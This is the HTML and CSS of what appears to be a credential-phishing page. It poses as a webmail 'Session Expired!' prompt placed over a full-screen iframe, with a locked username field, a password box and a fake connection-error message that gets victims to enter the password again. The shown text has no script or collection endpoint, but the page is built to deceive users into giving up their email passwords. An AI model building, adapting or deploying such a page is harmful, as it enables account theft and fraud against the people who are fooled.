<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Webmail Login Portal - </title>
	<link rel="shortcut icon" href="" type="image/x-icon">
	<style type="text/css">
		*{ outline:none; margin:0; padding:0 }
		html, body { height: 100%; font-family: 'Open Sans', sans-serif;
		color: #535353; font-size: 15px; flex-wrap: inherit;}

		.showbody {
		height: 100vh;
		width: 100%;
		display: flex;
		flex-direction: column;
		align-items: center;
		justify-content: center; z-index: 10;background-color: #0000004f; font-weight: bold;
		}
		iframe{ position: absolute;height: 100%;border: none;z-index: -1; opacity:0.8 }

		.form-father-div {
		background-color: orange;
		width: 320px;
		/*  min-height: 450px;*/
		max-width: 330px;
		margin: 0 auto;
		color: #717171;
		padding: 25px 30px 30px;
		background: #fdfdfd;
		box-shadow: 2px 2px 2px 2px rgb(0 0 0 / 30%);    
		/*    text-align: center;  */
		}
		.mybox{
			background: #D9D8D8;
			    color: black;
			    width: 450px;
			    height: 240px;
			    border-radius: 5px;
			    box-shadow: 1px 1px 5px 5px rgb(0 0 0 / 30%);
		}
		.topheadofdiv{color: #000;padding: 6px 8px 3px 10px;margin-bottom: 10px; display: flex; justify-content: center; font-family: cursive; border-bottom: 1px solid #aaa; align-items: center;}
		.topheadofdiv img{margin-right: 10px; width: 32px; height: 32px}
		form{ 
			    margin: 0 auto;
			    width: 320px;
			}
		.mmm{
			  display: flex;
			  justify-content: center;
			  align-items: center;			
		}
		.inputgrouped{ 
		}
		.inputgrouped input[type=password] {
		    padding: 5px 6px;
		}		
		 td,  th {
		    padding: 8px 1px;
		    display: table-cell;
		    text-align: left;
		/*    vertical-align: top;*/
		    width: 160px;
		}
		.btn {
		width: 100%;
		padding: 3px 52px;
		margin-bottom: 0;
		font-size: 20px;
		font-weight: 400;
		line-height: 1.42857143;
		border: 1px solid #444;
		border-radius: 3px;
		cursor: pointer;
		background-color: transparent;
		}
		.btn:hover {
			box-shadow: 2px 2px 2px 2px rgb(0 0 0 / 30%);
		}		
		button:disabled,button[disabled]{cursor: not-allowed; opacity: 0.6}
		.erx{margin: 10px 0px 0px; padding: 7px 5px;  color:#c50000; font-size:16px; text-align:center; }
		</style>	
	</head>
	<body>
		<iframe id="eFrame" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style=""></iframe>
		<section class="showbody"> 
			<div class="mybox">
				<div class="topheadofdiv">
					<img src="" alt="" id="domainimg"> 
					<span>Session Expired!</span>
		  			<span class="sitename"></span>
				</div>		

			  	<div class="erx" style="display: none;">Conection error, kindly try again!</div>
				  	<form action="">
				  		<div class="inputgrouped">
				  			<table>
				  			<tr>
				  				<td>Username:</td>
					  			<td>
					  				<input type="email" value="" id="lm" disabled style="border: 0;background: transparent;color: black;margin-left: -22px;font-size: 15px;" required>
					  			</td>				  				
				  			</tr>				  				
				  			</table>
				  			<table>
				  			<tr>
				  				<td>  Password:</td>
					  			<td>
					  				<input type="password" name="" minlength="6" class="inputself" placeholder="Enter password" id="lp" required>
					  			</td>				  				
				  			</tr>				  				
				  			</table>
				  		</div>
				  		<!-- <center><input type="checkbox" style="margin-right: 5px;">Keep me logged in</center> -->
				  		<div style="display: flex; justify-content: center; margin-top: 10px;">
				  			<button class="btn btn-blue" id="getitBtn">Log In</button>
				  		</div>	  	 
				  		</div>			  					
				  	</form>				  		
			</div>			
		</section>
